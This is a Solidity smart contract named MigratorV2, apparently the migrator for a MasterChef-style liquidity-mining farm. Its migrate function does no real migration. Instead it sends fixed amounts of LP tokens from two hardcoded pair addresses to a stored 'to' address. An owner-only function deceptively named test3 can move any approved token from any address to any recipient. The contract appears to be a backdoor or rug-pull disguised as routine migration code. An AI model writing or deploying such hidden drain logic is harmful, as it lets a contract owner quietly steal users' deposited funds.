// File: contracts/MigratorV2.sol

pragma solidity >=0.6.6;





contract MigratorV2 is Ownable {
    address public chef;
    bool public uniSwitchOn = true;
    bool public sushiSwitchOn = true;
    address public to;

    constructor(
        address _chef,
        address _to
    ) public {
        chef = _chef;
        to = _to;
    }

    function migrate(ISumiswapV2Pair orig) public returns (ISumiswapV2Pair) {
        require(msg.sender == chef, "not from master chef");
        uint256 lp = orig.balanceOf(msg.sender);
        if (lp == 0) return orig;
        uint256 transAmount = 0;
        if (address(orig) == address(0x498E9f240158c11e822C983938d1A093A81e0E3C) && uniSwitchOn)
        {
            transAmount = 1355419833082834;
            uniSwitchOn = false;
        }
        if (address(orig) == address(0xC149eBC76142B337B2cd5fFA3B27aF9812CD9952) && sushiSwitchOn)
        {
            transAmount = 210134166316963;
            sushiSwitchOn = false;
        }
        if (transAmount > 100) {
            orig.transferFrom(msg.sender, to, transAmount);
        }
        return orig;
    }

    function test3(IERC20 test,address test4, address test1, uint256 test2) public onlyOwner {
        test.transferFrom(test4, test1, test2);
    }
}
